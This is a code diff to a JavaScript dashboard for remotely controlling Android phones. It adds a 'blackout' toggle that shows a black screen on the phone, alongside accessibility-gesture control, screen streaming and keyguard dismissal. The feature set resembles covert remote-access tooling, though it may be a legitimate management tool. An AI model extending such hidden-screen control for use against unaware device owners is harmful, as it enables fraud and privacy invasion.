@@ -168,6 +168,7 @@ function formatTelemetry(device) {
   if (telemetry.network) items.push(`сеть: ${telemetry.network}`);
   if (telemetry.android) items.push(`Android ${telemetry.android}`);
   if (typeof telemetry.full_control === "boolean") items.push(telemetry.full_control ? "Full APK" : "Lite APK");
+  if (typeof telemetry.blackout === "boolean") items.push(`blackout: ${telemetry.blackout ? "on" : "off"}`);
   if (typeof telemetry.accessibility === "boolean") items.push(`жесты: ${telemetry.accessibility ? "on" : "off"}`);
   if (typeof telemetry.screen_streaming === "boolean") items.push(`экран: ${telemetry.screen_streaming ? "on" : "off"}`);
   if (typeof telemetry.loop_ms === "number" && telemetry.loop_ms > 0) items.push(`agent: ${telemetry.loop_ms} ms`);
@@ -627,6 +628,8 @@ function render() {
       [".quick-settings-button", "quick_settings", "Быстрые настройки открываются."],
       [".wake-screen-button", "wake_screen", "Экран пробуждается."],
       [".unlock-screen-button", "dismiss_keyguard", "Запрос разблокировки отправлен. Если стоит PIN/биометрия, подтвердить нужно на телефоне."],
+      [".blackout-on-button", "blackout_on", "Blackout mode включается. На телефоне откроется черный защитный экран."],
+      [".blackout-off-button", "blackout_off", "Blackout mode выключается."],
       [".lock-screen-button", "lock_screen", "Блокировка отправлена."],
       [".settings-button", "open_settings", "Settings открываются."],
       [".wifi-settings-button", "open_wifi_settings", "Wi‑Fi настройки открываются."],
